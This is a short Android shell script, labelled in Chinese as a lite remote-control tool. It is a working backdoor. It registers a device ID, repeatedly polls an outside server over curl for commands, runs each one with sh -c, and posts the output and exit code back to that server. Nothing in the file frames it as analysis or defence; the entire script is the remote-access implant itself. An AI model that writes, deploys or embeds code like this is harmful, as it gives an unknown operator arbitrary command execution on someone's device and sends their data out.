#!/bin/sh
# 凡吾远控 精简版

BASE="http://fw-adb.mhfs.eu.org.cc/"
KEY_FILE="/data/local/tmp/device_key"
API_KEY="把你的api_key填这里"

# 自动查找curl
CURL=$(which curl 2>/dev/null)
[ -z "$CURL" ] && CURL="/system/bin/curl"

# 生成或读取设备ID
if [ -f "$KEY_FILE" ]; then
    DEVICE_KEY=$(cat "$KEY_FILE")
else
    DEVICE_KEY="dev_$(date +%s | tail -c 7)$(echo $RANDOM | tail -c 3)"
    echo "$DEVICE_KEY" > "$KEY_FILE"
fi

while true; do
    RESP=$($CURL -s --connect-timeout 5 --max-time 10 \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -X POST \
        -d "action=register&key=$DEVICE_KEY&api_key=$API_KEY" \
        "$BASE/api.php")
    
    CMD=$(echo "$RESP" | sed 's/.*"cmd":"//' | sed 's/".*//')
    
    if [ -n "$CMD" ] && [ "$CMD" != "null" ]; then
        # 清除命令
        $CURL -s --connect-timeout 5 --max-time 10 \
            -H "Content-Type: application/x-www-form-urlencoded" \
            -X POST \
            -d "action=clear_cmd&key=$DEVICE_KEY" \
            "$BASE/api.php" > /dev/null 2>&1
        
        # 执行命令
        OUT=$(sh -c "$CMD" 2>&1)
        CODE=$?
        
        # 上报结果 - 使用更大的输出限制
        OUT_SHORT=$(echo "$OUT" | head -c 65535)
        $CURL -s --connect-timeout 5 --max-time 10 \
            -H "Content-Type: application/x-www-form-urlencoded" \
            -X POST \
            --data-urlencode "action=result" \
            --data-urlencode "key=$DEVICE_KEY" \
            --data-urlencode "cmd=$CMD" \
            --data-urlencode "output=$OUT_SHORT" \
            --data-urlencode "exit_code=$CODE" \
            "$BASE/api.php" > /dev/null 2>&1
    fi
    
    sleep 3
done